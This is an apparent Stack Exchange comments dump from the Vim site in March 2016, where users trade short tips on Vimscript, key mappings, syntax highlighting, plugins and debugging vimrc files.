  <row Id="10911" PostId="6785" Score="1" Text="`dpkg -L vim | grep bin`" CreationDate="2016-03-06T10:58:37.467" UserId="71" />
  <row Id="10912" PostId="6785" Score="1" Text="@ChristianBrabandt On ubuntu at least `apt` and `dpkg` don't install vim in a single package &quot;vim&quot;, its organised as mulitple dependency packages, so `dpkg -L vim` isn't necessarily going to be useful. e.g. for `vim-gtk` it doesn't even mention where the `$VIMRUNTIME` is at all" CreationDate="2016-03-06T11:05:20.200" UserId="4603" />
  <row Id="10913" PostId="6785" Score="2" Text="@the_velour_fog  He did `apt-get install vim`. So he can see what is installed with the provided command. And yes, on Ubuntu there exists a basic package vim. See `apt-cache show vim` Yes there are other vim flavor packages. Then one should check which package was installed and can use that package name instead of vim in the above command." CreationDate="2016-03-06T11:47:16.843" UserId="71" />
  <row Id="10914" PostId="6788" Score="0" Text="You could have found answers to all your questions so far in the built-in documentation. In Vim, type `:help` and read along." CreationDate="2016-03-06T12:21:18.450" UserId="54" />
  <row Id="10916" PostId="6789" Score="0" Text="What makes you say the fhs isn't followed on Debian and Ubuntu Vim?" CreationDate="2016-03-06T13:28:07.980" UserId="205" />
  <row Id="10917" PostId="6789" Score="0" Text="@muru I mis-spoke. My first impression after seeing  the bulk of the files were in `/usr/share/vim/vim74`  in a &quot;monolithic&quot;  configuration - was they weren't following FHS. But I guess because vim's code is architecture independent? its following FHS after all? I have edited answer as I dont actually know that answer to that." CreationDate="2016-03-06T13:50:15.143" UserId="4603" />
  <row Id="10920" PostId="6788" Score="1" Text="Specifically, [`:help vimrc`](http://vimhelp.appspot.com/starting.txt.html#vimrc) :-)" CreationDate="2016-03-06T14:13:58.267" UserId="51" />
  <row Id="10922" PostId="6792" Score="4" Text="It helps reading Vim's scripting help first ... To quote: `Vim automatically converts a string to a number when it is looking for a number.` If you want ASCII char conversion instead, see `char2nr()` and `nr2char()`." CreationDate="2016-03-06T15:07:07.047" UserId="1800" />
  <row Id="10923" PostId="6792" Score="2" Text="And there's the `str2nr` function." CreationDate="2016-03-06T15:18:33.817" UserId="205" />
  <row Id="10924" PostId="6792" Score="2" Text="If you know it is a number, you can also simply add zero to it." CreationDate="2016-03-06T15:19:07.690" UserId="71" />
  <row Id="10925" PostId="6792" Score="0" Text="I'm not trying to parse it... Also I'm more wondering about casting in general. Casting from char to int is just one example." CreationDate="2016-03-06T15:29:44.703" UserId="1410" />
  <row Id="10926" PostId="6792" Score="2" Text="http://learnvimscriptthehardway.stevelosh.com/ (sections: &quot;variables&quot;, &quot;numbers&quot; and &quot;strings&quot;)" CreationDate="2016-03-06T15:41:43.733" UserId="1800" />
  <row Id="10927" PostId="6792" Score="2" Text="[`:help variables`](http://vimhelp.appspot.com/eval.txt.html#variables)" CreationDate="2016-03-06T15:42:45.720" UserId="51" />
  <row Id="10928" PostId="6792" Score="0" Text="It's not letting me post the answer because it is too simple. The answer is no." CreationDate="2016-03-06T15:50:10.880" UserId="1410" />
  <row Id="10929" PostId="6795" Score="1" Text="Note that mapping Control + Shift + key separate from Control + key doesn't work. See: [Can I map a Ctrl + upper-case letter separately from Ctrl + lower-case letter?](http://vi.stackexchange.com/q/4290/51) (keys like F1 are special cases). That being said, the mapping looks fine. Which Vim are using? MacVim?" CreationDate="2016-03-06T18:20:56.093" UserId="51" />
  <row Id="10930" PostId="6793" Score="1" Text="It says `001b`, which is the escape character. There is something in your vimrc file that does this (either something you added yourself, or a plugin). See: [How do I debug my vimrc file?](http://vi.stackexchange.com/q/2003/51)." CreationDate="2016-03-06T18:28:44.497" UserId="51" />
  <row Id="10931" PostId="6795" Score="0" Text="Ok, thanks for letting me know. I'll try using `&lt;M&gt;` instead of `&lt;S-C&gt;`. I'm not using MacVim. I'm using regular Vim 7.4.1129 installed via MacPorts." CreationDate="2016-03-06T18:38:50.980" UserId="6689" />
  <row Id="10932" PostId="6792" Score="1" Text="I use `eval()` to convert a string into a number, and `string()` to convert in the reverse direction. I prefer `eval()` over `+0`, it makes the intends more obvious." CreationDate="2016-03-06T18:55:22.710" UserId="626" />
  <row Id="10933" PostId="6797" Score="0" Text="So, on 16.04, I can load python2 and python3 in the same Vim session?" CreationDate="2016-03-06T19:15:45.177" UserId="205" />
  <row Id="10934" PostId="6744" Score="0" Text="Yeah. My bad. After commenting out `color solarized` it finally works. Actually I also uncommented it back and then it is now all OK with Solarized." CreationDate="2016-03-06T20:54:29.527" UserId="2788" />
  <row Id="10935" PostId="6798" Score="2" Text="[How about any of these](http://www.vim.org/scripts/script_search_results.php?keywords=thesaurus&amp;script_type=&amp;order_by=rating&amp;direction=descending&amp;search=search)?" CreationDate="2016-03-06T22:43:46.323" UserId="51" />
  <row Id="10936" PostId="6798" Score="0" Text="Mmmm, the only one of those that looks relevant is the one on github which I independently found. The first link in my first sentence. It would appear that the best available option for now is the one I have just made an answer for." CreationDate="2016-03-06T22:44:59.010" UserId="390" />
  <row Id="10937" PostId="2002" Score="1" Text="You can also use `'` (apostrophe) instead of `\`` (backtick)." CreationDate="2016-03-07T00:01:53.020" UserId="1278" />
  <row Id="10950" PostId="6804" Score="1" Text="You might want to look at http://stackoverflow.com/a/6991712/2558252, it provides a way of delaying a command, you could use this in combination with your idea." CreationDate="2016-03-07T09:25:50.960" UserId="1821" />
  <row Id="10951" PostId="6805" Score="5" Text="You may want to create a function for this and call it with `nnoremap gb :call YourFunction()&lt;CR&gt;`. In the function you can do all your mapping is currently doing and have a more nicer view." CreationDate="2016-03-07T10:24:39.117" UserId="1821" />
  <row Id="10952" PostId="2979" Score="1" Text="This patch doesn't seem to actually be elastic tabstops. Instead it's variable tabstops, but you have to set up the stop points ahead of time. This is nice in its own way but not really what the question is about." CreationDate="2016-03-07T10:29:52.643" UserId="267" />
  <row Id="10953" PostId="2970" Score="1" Text="There is a [feature request](https://github.com/neovim/neovim/issues/1419) open for this on Neovim." CreationDate="2016-03-07T10:33:08.440" UserId="267" />
  <row Id="10954" PostId="6805" Score="2" Text="@Nobe4 I think part of my problem is confusion between `remap`, `remap &lt;expr&gt;`, `function` and `command`. I'm not sure what I'm writing where. I'm not sure exactly what syntax to use for this function, as obviously my last piece of code is a hybrid of different things (and doesn't work as is). Could you possibly write an answer with the function code itself?" CreationDate="2016-03-07T10:38:31.933" UserId="1278" />
  <row Id="10956" PostId="6805" Score="0" Text="Done, check my answer and ask if you have any question" CreationDate="2016-03-07T10:44:13.133" UserId="1821" />
  <row Id="10957" PostId="6806" Score="0" Text="Perfect! Thank you!" CreationDate="2016-03-07T10:59:45.330" UserId="1278" />
  <row Id="10958" PostId="6766" Score="0" Text="@user37078 glad you figured it out." CreationDate="2016-03-07T11:02:03.440" UserId="1405" />
  <row Id="10959" PostId="6803" Score="2" Text="This shouldn't change much between OSs. Is there any chance you are using some colorscheme on linux and forgot to set it when using windows? (check `:echo g:colors_name`)" CreationDate="2016-03-07T11:06:27.243" UserId="1405" />
  <row Id="10960" PostId="6795" Score="0" Text="If it can add some information I have `:nnoremap &lt;S-C-f&gt; :w&lt;CR&gt;` working fine on a Windows gVim 7.4 and a CentOS terminal vim 7.4 so maybe it comes from something in your setup." CreationDate="2016-03-07T12:26:39.240" UserId="1841" />
  <row Id="10961" PostId="6805" Score="3" Text="@Sparhawk: As a general heads up in vimscript a command is an operation that you start from the command mode which you enter with `:` (example `:echo &quot;foo&quot;`). A function is a set of commands that you define in your `.vimrc` or another `.vim` file, you can call the function from the command line mode `:call YourFunction()`. Finally a mapping is the fact to assign an action to a key or a key sequence (e.g. `:map &lt;C-a&gt; :call YourFunction()&lt;CR&gt;` says to Vim &quot;When I press Ctrl-a do as if I had press `:` followed by `call YourFunction` followed by `Enter`)." CreationDate="2016-03-07T12:34:24.367" UserId="1841" />
  <row Id="10962" PostId="6805" Score="0" Text="@statox Thank you very much for that. That makes it a bit clearer. So you can `map` keystrokes like `gg`, but if you wanted to move to the top of a file with a function or command, you couldn't use that keystroke. The other thing that got me was that you couldn't use `normal!` in a command, but apparently it's okay in a function." CreationDate="2016-03-07T12:41:43.737" UserId="1278" />
  <row Id="10963" PostId="6805" Score="2" Text="@Sparhawk: `gg` is a normal mode mapping so if you want to use it in a function you have to say to vim &quot;Use gg as if I was in normal mode&quot; you do that with `normal gg`. In the command line using `:normal gg` will be the same as typing `gg` in normal mode. Actually the best I can advise to you is to [learnVimScriptTheHardWay](http://learnvimscriptthehardway.stevelosh.com/) it might be a lot of reading but you'll find an answer to 98% of your questions there and you can ask the 2% remaining on this site ;-)" CreationDate="2016-03-07T13:11:12.880" UserId="1841" />
  <row Id="10965" PostId="6803" Score="0" Text="the pink kind of highlighting remains for all colorscheme in windows" CreationDate="2016-03-07T15:19:30.827" UserId="6706" />
  <row Id="10966" PostId="6795" Score="1" Text="[Also asked on Stack Overflow](http://stackoverflow.com/q/35850002/660921)" CreationDate="2016-03-07T17:25:05.977" UserId="51" />
  <row Id="10970" PostId="2979" Score="0" Text="@Caleb, you could probably script something, once var tabstop patch has been merged." CreationDate="2016-03-07T18:54:23.567" UserId="71" />
  <row Id="10973" PostId="2979" Score="0" Text="@Christian no you couldn't. See the discussion around the web but this can't be done as a script/plugin in vim (even with the variable with tabstop patch) because it only keeps one method to render all lines with. It just doesn't expose what you would need to make this work." CreationDate="2016-03-07T19:17:12.663" UserId="267" />
  <row Id="10976" PostId="6806" Score="0" Text="Oh, one small problem. It doesn't leave me in insert mode at the end. I can just append `i` to `nnoremap gb ...`, but is there a more elegant way (by modifying the function instead)?" CreationDate="2016-03-07T20:53:23.913" UserId="1278" />
  <row Id="10977" PostId="6806" Score="1" Text="Yes, let me update my answer" CreationDate="2016-03-07T20:54:31.250" UserId="1821" />
  <row Id="10979" PostId="6806" Score="0" Text="Thank you again!" CreationDate="2016-03-07T22:33:53.733" UserId="1278" />
  <row Id="10980" PostId="6782" Score="1" Text="I need to type Devanagari or Hindi characters. Encoding was previously set to latin1, it was changed as per your suggestion to utf-8. But still no Devanagari or Hindi characters are visible. But when I copy those boxes (as rendered by VIM), from VIM to browser or Notepad++,  they look like Unicode characters. So VIM recognizes, but can't display them." CreationDate="2016-03-08T04:20:27.263" UserId="6462" />
  <row Id="10982" PostId="6782" Score="1" Text="@msinfo Which Vim version are you using? You mentioned 7.4, but didn't mention the patch level? I used 7.4.1024 [from vim.org](http://www.vim.org/download.php#pc)." CreationDate="2016-03-08T04:28:46.957" UserId="51" />
  <row Id="10993" PostId="6795" Score="2" Text="OS X will interpret Option-S as ß. To map it in Vim, you need to do `:inoremap ß Hey whats up`." CreationDate="2016-03-08T05:03:08.843" UserId="4729" />
  <row Id="10994" PostId="6782" Score="1" Text="It seems un-patched, as I tried to find out from one of your answer ;-) on http://vi.stackexchange.com/questions/2466/how-do-i-know-the-patch-version-of-my-vim. Vim --version doesn't show any patch info. I have not made any plugin or patch changes, after installation." CreationDate="2016-03-08T06:14:02.780" UserId="6462" />
  <row Id="10995" PostId="6782" Score="4" Text="@msinfo Vim 7.4 was released almost two and half years ago. Try installing the newer version. Maybe that's all that's needed?" CreationDate="2016-03-08T06:17:22.033" UserId="51" />
  <row Id="10996" PostId="6777" Score="0" Text="This questions is seeking debugging help (&quot;**why isn't this working?**&quot;), cannot be reproduced, and doesn't include any vimrc files. It is most likely related to a setting, combination of settings, or a plugin. Please see [How do I debug my vimrc file?](http://vi.stackexchange.com/q/2003/51) and [How to create a Minimal, Complete, and Verifiable example?](http://meta.vi.stackexchange.com/q/1325/51)." CreationDate="2016-03-08T07:57:20.243" UserId="51" />
  <row Id="10998" PostId="456" Score="0" Text="If you don't want to create a function to move to the previous position you could just press ``​`​`` twice after the replace is finished.&#xA;&#xA;This opens the possibility to create a oneliner like this:&#xA;```%s/\s\+$//e | exe &quot;normal ``&quot;```" CreationDate="2016-03-08T10:00:29.600" UserId="2710" />
  <row Id="10999" PostId="456" Score="0" Text="@NeaţuOvidiuGabriel I spent ten minutes trying to format the bloody backticks in your comment. I couldn't do it :-( Sorry :-( And thanks for the suggestion!" CreationDate="2016-03-08T10:01:48.517" UserId="51" />
  <row Id="11000" PostId="456" Score="0" Text="I removed the previous comment and added a new, more polished, one." CreationDate="2016-03-08T10:05:28.190" UserId="2710" />
  <row Id="11001" PostId="6815" Score="3" Text="I think you can, try looking at http://vim.wikia.com/wiki/Different_syntax_highlighting_within_regions_of_a_file" CreationDate="2016-03-08T11:43:33.483" UserId="1821" />
  <row Id="11002" PostId="6815" Score="5" Text="Depending on your markdown plugin, you may or may not have already support for syntax coloring of included &quot;code blocks&quot;. In the first case, you will (just) have to alter the plugin's syntax to recognize your &quot;R chunks&quot; as valid code blocks. In the 2nd case, perhaps you can inspire yourself from Junegunn's vimrc, especially the functions `s:syntax_include` and `s:file_type_handler`: https://github.com/junegunn/dotfiles/blob/master/vimrc" CreationDate="2016-03-08T12:02:28.913" UserId="1800" />
  <row Id="11003" PostId="6541" Score="1" Text="On Linux, gvim can display the characters you want because Pango will pull in glyphs from other fonts to be able to display all the characters.  That's also why the characters look different than the rest of your text.  If you try the same thing in xterm, then you won't see all the characters because a single font is used.  I suspect something similar is happening on Windows." CreationDate="2016-03-08T13:55:22.027" UserId="15" />
  <row Id="11004" PostId="6262" Score="0" Text="Very cool.  Doesn't include the full path if you've traversed into your tree in netrw..." CreationDate="2016-03-08T14:38:36.157" UserId="6721" />
  <row Id="11005" PostId="6815" Score="1" Text="Thanks! Both these answers are useful." CreationDate="2016-03-08T15:58:52.287" UserId="6718" />
  <row Id="11006" PostId="6815" Score="3" Text="Is this a markdown file that happens to have R code inside of code blocks?  If so you may want to add R to your `g:markdown_fenced_languages` in your `vimrc` e.g. let g:markdown_fenced_languages = ['r']`. I am assuming you are using the [default markdown syntax](https://github.com/tpope/vim-markdown) provided by Tim Pope. [More on fenced languages](https://www.reddit.com/r/vim/comments/2x5yav/markdown_with_fenced_code_blocks_is_great/)" CreationDate="2016-03-08T18:15:14.577" UserId="778" />
  <row Id="11007" PostId="2979" Score="0" Text="@Caleb you mean, elastic tabstops means having (potentially) different tabstop settings per line and tabstop?" CreationDate="2016-03-08T18:47:39.470" UserId="71" />
  <row Id="11008" PostId="2979" Score="0" Text="@Christian Not probably, that's the whole idea. And ones on adjacent lines will stretch to align with changes on the current (or other modified]s) lines. Read the spec as linked in the question." CreationDate="2016-03-08T21:11:11.593" UserId="267" />
  <row Id="11009" PostId="6819" Score="0" Text="Perhaps try `-I` instead of `-isystem`." CreationDate="2016-03-08T22:09:38.887" UserId="1800" />
  <row Id="11010" PostId="6819" Score="0" Text="@VanLaser that makes sense. But now it still has some problems. When I start to type `glcle` (while looking for glClearBuffer function), it popups a list of matching IDs from the local file (it seems). Only when I press `ctrl-space` the list gets populated with all the stuff from `glew.h`. Any ideas on how to make it load it by default?" CreationDate="2016-03-08T22:57:25.767" UserId="6724" />
  <row Id="11011" PostId="6819" Score="0" Text="I don't use YCM. From what I see in the docs, you'd probably have to play with adjusting the various `g:ycm_` prefixed options, which enable/disable or make kick in sooner, or later, various completions types. But I may be wrong." CreationDate="2016-03-08T23:23:57.393" UserId="1800" />
  <row Id="11012" PostId="6819" Score="0" Text="@VanLaser you are right - I am currently looking at https://github.com/Valloric/YouCompleteMe#the-gycm_semantic_triggers-option and I think this may be it, but I still haven't got it right." CreationDate="2016-03-08T23:25:30.720" UserId="6724" />
  <row Id="11013" PostId="6815" Score="1" Text="Vim syntax files are, like most things in Vim, just a sequence of Ex commands put in a file. You can include one, two, three, or as many as you want. Creating a syntax file which highlights some blocks as language A and other blocks as language B is not that hard (actually, [I just did this in another answer](http://stackoverflow.com/a/35882720/660921)). However, I'm not entirely sure whatthe &quot;knitr&quot; documents look like? Is this just Markdown? Or a different syntax?" CreationDate="2016-03-09T04:41:41.863" UserId="51" />
  <row Id="11014" PostId="6820" Score="2" Text="Uninstall Vim and then reinstall it with the path that you want?" CreationDate="2016-03-09T05:03:47.953" UserId="51" />
  <row Id="11015" PostId="6820" Score="0" Text="Isn't there another way?" CreationDate="2016-03-09T05:08:23.357" UserId="6728" />
  <row Id="11016" PostId="6820" Score="0" Text="Yes, manually duplicating the steps of uninstalling and installing ;-) You probably don't *need* to do the uninstall step by the way, but having two Vim installations strikes me as a potential source of great confusion. Why do you want to do this &quot;another way&quot;?" CreationDate="2016-03-09T05:10:55.357" UserId="51" />
  <row Id="11017" PostId="6820" Score="0" Text="Mainly to learn, I guess." CreationDate="2016-03-09T05:12:51.567" UserId="6728" />
  <row Id="11018" PostId="6820" Score="0" Text="Thanks for the answer! :-)&#xA;Much love, blessings." CreationDate="2016-03-09T05:22:40.923" UserId="6728" />
  <row Id="11019" PostId="6820" Score="3" Text="There's no problem with relocating the executable--the problem is relocating the plugin files. You might be able to solve that problem by setting the VIM environment variable to the new location of the vim74 directory." CreationDate="2016-03-09T06:49:32.440" UserId="2055" />
  <row Id="11020" PostId="6818" Score="0" Text="Excellent show reel of vimscript!" CreationDate="2016-03-09T07:46:34.973" UserId="6495" />
  <row Id="11021" PostId="6820" Score="0" Text="I don't really understand why you want to do that: you said it is to learn but I don't see what you want to learn precisely. Anyway maybe you'd be interested in [`:h 'runtimepath'`](http://vimdoc.sourceforge.net/htmldoc/options.html#%27runtimepath%27)" CreationDate="2016-03-09T12:55:59.407" UserId="1841" />
  <row Id="11022" PostId="6799" Score="0" Text="Note that the plugin on the referenced answer was already mentioned on the first comment above." CreationDate="2016-03-09T18:41:30.437" UserId="1405" />
  <row Id="11023" PostId="6821" Score="1" Text="Very closely related: [Can't map German 'umlaut' keys in .vimrc](http://vi.stackexchange.com/q/6629/51). Perhaps not *entirely* a duplicate though, since that question deals with `&lt;C-ö&gt;` mappings, and this is without the Control key..." CreationDate="2016-03-09T21:57:55.383" UserId="51" />
  <row Id="11024" PostId="6821" Score="0" Text="@Carpetsmoker This is actually a different issue and has to do with the relationship between keystrokes and characters sent to the terminal." CreationDate="2016-03-10T00:41:08.297" UserId="6495" />
  <row Id="11025" PostId="6821" Score="0" Text="@PhilippMoers Okay, thanks ;-) I thought it was the same problem at first, but then I wasn't sure, and didn't have time to look into it." CreationDate="2016-03-10T00:43:07.717" UserId="51" />
  <row Id="11026" PostId="3304" Score="0" Text="&quot;wasn't actually showing me this new line&quot; - in Unix, there is no line. A line is defined as &quot;number of non-LF characters, terminating in a LF character&quot;.  If you think of LF not as &quot;go to next line&quot; but &quot;end of line&quot;, what Vim does suddenly makes much more sense." CreationDate="2016-03-10T04:56:53.243" UserId="4729" />
  <row Id="11028" PostId="6822" Score="0" Text="Thanks for answering&#xA;  I looked in the help and omap seem to bee the right option. &#xA;  But it don’t work for me. I testet it in with vim started with the -u NONE option to see that its not a Problem of my .vimrc or a Plugin. I used the command `:onoremap ä ]` and to see if its a Problem with the umlaut key `:onoremap z ]` but it didn’t work.&#xA;I fond lmap in the heat and with&#xA;`:set lmap=ä]`&#xA;  It work for things like di but not for the f and t with this the keys are treated as there originals. But the help says „|:lmap| mappings apply to {char}“&#xA;  Any Ideas how I can get it work for this keys too." CreationDate="2016-03-10T07:05:05.327" UserId="6710" />
  <row Id="11029" PostId="6823" Score="2" Text="According to [`:h E334`](http://vimdoc.sourceforge.net/htmldoc/gui.html#E334) I'm wondering if your problem isn't related to the lines  45-46 of your `.vimrc`. I'm not really familiar with the `aunmenu` option so I can't really help but maybe you should head this way. Also see [this question](http://vi.stackexchange.com/q/2003/1841) about how to debug your `.vimrc`" CreationDate="2016-03-10T08:39:22.783" UserId="1841" />
  <row Id="11030" PostId="6823" Score="0" Text="Why do you remove those menus?" CreationDate="2016-03-10T08:43:51.593" UserId="54" />
  <row Id="11031" PostId="6823" Score="0" Text="I didn't even know about these lines; my `.vimrc` is a huge patchwork of examples and I do not understand everything in there. @statox, if you put this as an answer, I will accept it --- deleting these lines fixed my problem and doesn't seem to have broken anything" CreationDate="2016-03-10T08:51:50.490" UserId="5965" />
  <row Id="11032" PostId="6823" Score="0" Text="@Akiiino: If you're a new comer to Vim please don't use stuff you don't understand in your `.vimrc`: this question is the perfect example of why you shouldn't. Start with an empty `.vimrc` and built your own vim: you'll learn much more about this wonderful editor and you will not loose time debug options that you don't understand. And when you'll have issues about stuff you've done yourself it will be much easier for us to help you ;-)" CreationDate="2016-03-10T09:10:44.403" UserId="1841" />
  <row Id="11033" PostId="6826" Score="0" Text="Thanks. I'm sorry- I don't know how I could have missed that..." CreationDate="2016-03-10T10:24:45.893" UserId="3254" />
  <row Id="11034" PostId="3794" Score="0" Text="did you noticed that your popup completion seems to be on two lines ? I see the `2, kwargs='hippos')` on the line below `(arg1, arg`." CreationDate="2016-03-10T11:21:27.980" UserId="1821" />
  <row Id="11035" PostId="6821" Score="0" Text="I think it's obvious that `f{` won't work by just mapping stuff - doesn't `f` want the *actual* character it sees in the searched text? You will probably have to map `fä` to `f]` and so on, to get that type of functionality. At this point, I'd solve the problem at OS level, by adding a US layout and switch (maybe automatically) between DE and US as need arises. OTOH, it's entirely possible I'm missing something with Vim (this always happens) :)" CreationDate="2016-03-10T11:28:18.660" UserId="1800" />
  <row Id="11036" PostId="6821" Score="0" Text="Actually, since you seem to want to edit source code, I'd say switch to US layout and create Vim `inoremap`s such as `inoremap aa ä` and so on, to insert your specific characters." CreationDate="2016-03-10T12:12:29.903" UserId="1800" />
  <row Id="11037" PostId="6827" Score="0" Text="Maybe set both `ctermgb` and `ctermfg` to something other than `none` ? Example: http://vim.wikia.com/wiki/Highlight_current_line" CreationDate="2016-03-10T13:39:58.747" UserId="1800" />
  <row Id="11038" PostId="6827" Score="0" Text="If I add `ctermfg` all the text in the line will be coloured in the color specified. So, I will lose the syntax highlight in that line, and I don't want it." CreationDate="2016-03-10T13:47:14.793" UserId="6754" />
  <row Id="11039" PostId="3794" Score="0" Text="@nobe4, yes. that's what I meant by &quot;line wrapping&quot;.  I'm not sure it helps solve things though..." CreationDate="2016-03-10T16:25:18.537" UserId="69" />
  <row Id="11040" PostId="3794" Score="0" Text="can you check your `textwidth` and your `wrap` options ?" CreationDate="2016-03-10T16:27:14.157" UserId="1821" />
  <row Id="11044" PostId="6829" Score="0" Text="It would be helpful if you could provide a description of what you did in the answer itself. That way, the answer will also be useful to future readers, even after that link might be dead :-) Thank you!" CreationDate="2016-03-10T20:10:02.513" UserId="51" />
  <row Id="11048" PostId="6834" Score="0" Text="Perhaps [How do I navigate to topics in Vim's documentation?](http://vi.stackexchange.com/q/2136/51) is useful ;-)" CreationDate="2016-03-10T21:03:43.730" UserId="51" />
  <row Id="11052" PostId="6834" Score="0" Text="Not really. In emacs, I can go Ctrl-H k press the key I want to know about and it will give me the binding information. Vim seems to lack that function. How do I find out what a particular key combination is mapped to?" CreationDate="2016-03-10T21:26:23.913" UserId="6761" />
  <row Id="11055" PostId="6834" Score="0" Text="Did you read the marked duplicate? Because that tells you how to query the Vim help system for this information (list item no. 8): [`:help CTRL-W_CTRL-I`](http://vimhelp.appspot.com/tagsrch.txt.html#CTRL%2dW_CTRL%2dI) or [`:help CTRL-W_i`](http://vimhelp.appspot.com/tagsrch.txt.html#CTRL%2dW_i)" CreationDate="2016-03-10T21:29:45.737" UserId="51" />
  <row Id="11068" PostId="6833" Score="3" Text="Have you tried setting `'foldcolumn'` to 0?" CreationDate="2016-03-10T22:10:32.660" UserId="865" />
  <row Id="11070" PostId="4810" Score="0" Text="I didn't know about `&lt;c-f&gt;`, but I found that using `&lt;Esc&gt;` followed by `q:` showed me the unfinished ex mode command in my command line window." CreationDate="2016-03-11T04:09:47.723" UserId="4676" />
  <row Id="11071" PostId="6833" Score="3" Text="Thank you! inputting 'set foldcolumn=0' on Tlist commend line solved problem. but it's temporary. Whenever I create new Tlist, gray bar exist. I want to how remove gray bar to continue. I will search about 'fold' options." CreationDate="2016-03-11T04:45:14.730" UserId="6760" />
  <row Id="11072" PostId="2137" Score="6" Text="I actually updated the help to include a similar list `:h help-summary` (needs a recent Vim)" CreationDate="2016-03-11T07:05:22.103" UserId="71" />
  <row Id="11074" PostId="3794" Score="1" Text="Have you tried to debug your vimrc file [according to the steps here](http://vi.stackexchange.com/q/2003/51)? Perhaps there is a specific setting (or combination of a few settings) or another plugin that's causing this." CreationDate="2016-03-11T07:33:51.043" UserId="51" />
  <row Id="11075" PostId="2137" Score="0" Text="@ChristianBrabandt, thank you for that (and all the rest)." CreationDate="2016-03-11T08:18:26.743" UserId="54" />
  <row Id="11077" PostId="6837" Score="0" Text="I'm not sure to understand what you mean by &quot;the `:E` explorer mode&quot;? On my system it doesn't seems the a `:E` command exists: all I have is the `:Explore` command and it doesn't show a `.` directory." CreationDate="2016-03-11T08:43:23.763" UserId="1841" />
  <row Id="11078" PostId="6837" Score="0" Text="Yes, I do mean the :Explore command. So looks like there is something wrong with my vim or system settings." CreationDate="2016-03-11T08:49:47.957" UserId="6766" />
  <row Id="11079" PostId="6837" Score="2" Text="Have you tried using Tim Pope's [vinegar plugin](https://github.com/tpope/vim-vinegar.git)? It really improves `netrw` behavior. I'm not sure it is what makes the `.` directory disappear but it is generally a good plugin to use if you use `netrw`." CreationDate="2016-03-11T08:54:07.453" UserId="1841" />
  <row Id="11081" PostId="6839" Score="0" Text="Just checked on a friends machine. I think it should be hidden and not even show up. I think I might have messed up some defaults." CreationDate="2016-03-11T09:16:27.990" UserId="6766" />
  <row Id="11085" PostId="6837" Score="1" Text="I can't answer the &quot;how do I hide it&quot;-part, but as for the &quot;why&quot;-part: it allows you to do operations on the current directory. Is this really *that* useful in netrw? Not really if you ask me. But that's probably the reason why it's there..." CreationDate="2016-03-11T09:29:45.043" UserId="51" />
  <row Id="11093" PostId="6658" Score="0" Text="@dash-tom-bang That's right. I was putting it in ~/.vim/ftplugin" CreationDate="2016-03-11T14:30:52.817" UserId="6559" />
  <row Id="11094" PostId="6658" Score="0" Text="@Rich I say it irretrievably breaks the functionality because when I (re)set the filetype of something I'm editing, which I *think* causes Vim to reload the corresponding ftplugin, it still does not enable the functionality.  IOW, I can understand that the default plugin is overriding the custom one, but after reloading the custom one I would expect it to override the default and give me the missing functionality but it does not.  Perhaps my understanding is completely off." CreationDate="2016-03-11T14:34:38.957" UserId="6559" />
  <row Id="11095" PostId="6843" Score="2" Text="Thanks Luc..!!&#xA;Anything like VimFold4C will be too much for me.. !!&#xA;I will try with fold-by-syntax method." CreationDate="2016-03-11T14:37:17.660" UserId="6771" />
  <row Id="11096" PostId="6659" Score="0" Text="I did not know Vundle could be used because I did not see specific instructions for that in the README of the plugin.  I have since tried it and it worked perfectly.  Similarly, I would have used xmledit but did not see Vundle instructions for that either.   How do you know when a plugin is compatible with Vundle?" CreationDate="2016-03-11T14:43:17.000" UserId="6559" />
  <row Id="11097" PostId="6659" Score="0" Text="I did not try your suggestion for overriding ftplugins and since that is the exact title of the question I am unsure whether to mark the answer as correct :/  Thanks a bunch though" CreationDate="2016-03-11T14:48:20.063" UserId="6559" />
  <row Id="11099" PostId="6844" Score="4" Text="Also see another question asking essentially the same thing -- http://vi.stackexchange.com/q/5901/15" CreationDate="2016-03-11T15:08:46.187" UserId="15" />
  <row Id="11102" PostId="5901" Score="1" Text="See also [How to set the size of the GUI?](http://vi.stackexchange.com/q/6844/622)" CreationDate="2016-03-11T15:14:47.363" UserId="622" />
  <row Id="11103" PostId="6659" Score="1" Text="@Fonnae Glad you've got it working. Almost *all* plugins are compatible with Vundle, so the vast majority of them won't bother specifically mentioning that they *are* compatible. Your best bet for understanding how to install plugins with Vundle is to read `:help vundle`, rather than looking for instructions in each individual plugin's documentation." CreationDate="2016-03-11T16:44:27.070" UserId="343" />
  <row Id="11104" PostId="6834" Score="2" Text="I voted to re-open because the post-edit form of the question has a usefully different answer (&quot;:map &lt;Keys&gt; to print active mappings&quot;) than what's in the currently-linked duplicate about help navigation." CreationDate="2016-03-11T16:50:13.230" UserId="72" />
  <row Id="11106" PostId="6834" Score="1" Text="But the OP seems to know that, it's his first phrase. Would be nice for Vim to have a way to show (in a similar manner) all the non-mapped keys, i.e. what they do by default." CreationDate="2016-03-11T19:29:30.123" UserId="1800" />
  <row Id="11111" PostId="6839" Score="0" Text="Why are you deleting answers, saginaw? O.o OP just reposted this on [unix.se] (http://unix.stackexchange.com/q/269307/70524), and going by that post, your current answer is what he's looking for." CreationDate="2016-03-12T11:01:16.663" UserId="205" />
  <row Id="11112" PostId="6839" Score="0" Text="I thought the problem was in a default setting that was misconfigured and that the answer didn't solve the issue, sorry." CreationDate="2016-03-12T11:09:38.377" UserId="4939" />
  <row Id="11113" PostId="6852" Score="0" Text="Fantastic answer, extremely thorough and I understand now. Thank you." CreationDate="2016-03-12T15:55:56.790" UserId="6781" />
  <row Id="11114" PostId="6855" Score="1" Text="Yep. It seems, for manual loading of YCM for other filetypes, I'll have to call [`plug#load('YouCompleteMe')` first](https://github.com/junegunn/vim-plug/wiki/faq#loading-plugins-manually)." CreationDate="2016-03-12T21:39:36.143" UserId="205" />
  <row Id="11115" PostId="6822" Score="0" Text="I will let you know when I get `lmap` to work for the `f` command eventually." CreationDate="2016-03-13T00:09:01.560" UserId="6495" />
  <row Id="11116" PostId="6822" Score="0" Text="Anyway, you may be interested in [this](https://github.com/rhysd/clever-f.vim) handy plugin that allows you to specify a kind of *wildcard* character to match any special sign like braces or parens." CreationDate="2016-03-13T00:11:27.387" UserId="6495" />
  <row Id="11117" PostId="6853" Score="4" Text="Can you post the rest of your .vimrc file? Also, are you typing another key after the abbreviation in order to fire it?" CreationDate="2016-03-13T01:48:28.053" UserId="4932" />
  <row Id="11121" PostId="6858" Score="2" Text="I don't know if it will help you, but if `proton` is a colorscheme for the gui version of Vim, you could try creating  a `.gvimrc` file, and write the line `colorscheme proton` at the end of it." CreationDate="2016-03-13T11:29:52.550" UserId="4939" />
